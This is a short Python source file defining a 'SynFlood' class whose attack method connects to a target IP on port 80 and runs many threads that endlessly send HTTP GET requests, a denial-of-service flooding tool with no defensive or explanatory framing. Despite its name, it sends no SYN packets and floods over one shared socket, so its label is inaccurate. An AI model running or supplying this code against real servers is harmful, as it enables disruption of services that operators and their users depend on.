from socket import *
import threading
import time

class SynFlood():
    def __init__(self,ip, sleep_time, threading_count):
        self.ip = ip
        self.sleep_time = sleep_time
        self.threading_count = threading_count

    def attack(self):
        threads = []

        s = socket(AF_INET, SOCK_STREAM)
        s.connect((self.ip, 80))
        def begin():
            while True:
                s.send(bytes("GET / HTTP/1.0\r\n\r\n", "utf-8"))
                if self.sleep_time:
                    time.sleep(self.sleep_time)


        for i in range(self.threading_count):
            thread = threading.Thread(target=begin,)
            thread.start()
            threads.append(thread)

        for t in threads:
            t.join()
